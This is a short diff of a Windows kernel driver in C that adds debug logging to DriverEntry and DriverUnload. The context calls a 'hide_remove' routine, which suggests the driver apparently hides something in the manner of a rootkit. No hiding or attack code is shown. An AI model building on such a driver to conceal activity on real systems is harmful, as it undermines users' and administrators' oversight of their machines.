@@ -17,6 +17,8 @@ __stdcall
 DriverEntry(IN PDRIVER_OBJECT DriverObject,
             IN PUNICODE_STRING RegistryPath)
 {
+    DEBUG_PRINT("Inside DriverEntry");
+
     DriverObject->DriverUnload = DriverUnload;
 
     if( !device_and_slink_install(DriverObject) )
@@ -43,6 +45,8 @@ DriverEntry(IN PDRIVER_OBJECT DriverObject,
         return ( STATUS_SUCCESS );
     }
 
+    DEBUG_PRINT("DriverEntry successfully completed");
+
     return ( STATUS_SUCCESS );
 }
 
@@ -50,6 +54,8 @@ VOID
 __stdcall
 DriverUnload(IN PDRIVER_OBJECT DriverObject)
 {
+    DEBUG_PRINT("Inside DriverUnload");
+
     if( !hide_remove() )
     {
         DEBUG_PRINT("hide_remove failed\n");
@@ -59,4 +65,6 @@ DriverUnload(IN PDRIVER_OBJECT DriverObject)
     {
         DEBUG_PRINT("device_and_slink_remove failed");
     }
+
+    DEBUG_PRINT("DriverUnload successfully completed");
 }
